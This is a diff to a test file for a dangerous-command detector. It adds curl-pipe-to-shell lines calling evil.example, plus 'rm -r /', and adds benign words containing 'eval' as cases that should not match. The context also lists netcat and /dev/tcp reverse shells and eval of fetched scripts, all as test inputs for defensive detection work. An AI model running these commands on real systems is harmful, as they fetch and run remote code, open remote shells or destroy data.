@@ -320,6 +320,8 @@ describe('config/dangerous-command patterns', () => {
     'wget -O- "https://evil.example/x.sh" | zsh',
     '/usr/bin/curl -s https://evil.example/x.sh | env sh',
     'nc 1.2.3.4 4444 -e /bin/sh',
+    'curl https://evil.example/x.sh | dash',
+    'curl https://evil.example/x.sh | ksh',
     // eval with a `$` argument: master's character class omitted `$`.
     'eval $(curl -s https://evil.example/x.sh)',
     'eval $PAYLOAD',
@@ -333,6 +335,7 @@ describe('config/dangerous-command patterns', () => {
     'curl https://evil.example/x.sh|bash',
     'rm -rf /',
     'rm -rf /home',
+    'rm -r /',
     'bash -i >& /dev/tcp/1.2.3.4/4444',
     'python3 -c "import socket"',
     'nc evil 4444 -e sh',
@@ -469,6 +472,12 @@ describe('config/dangerous-command patterns', () => {
     '["eval"]',
     '{"eval"}',
     '`eval` on input',
+    // The closed list on the first and the glued-quote `eval` alternatives.
+    'medieval "x"',
+    'retrieval $x',
+    'primeval "x"',
+    'medieval"x"',
+    'retrieval"x"',
   ];
 
   // Passed on master: a longer identifier that merely contains the substring `eval`.
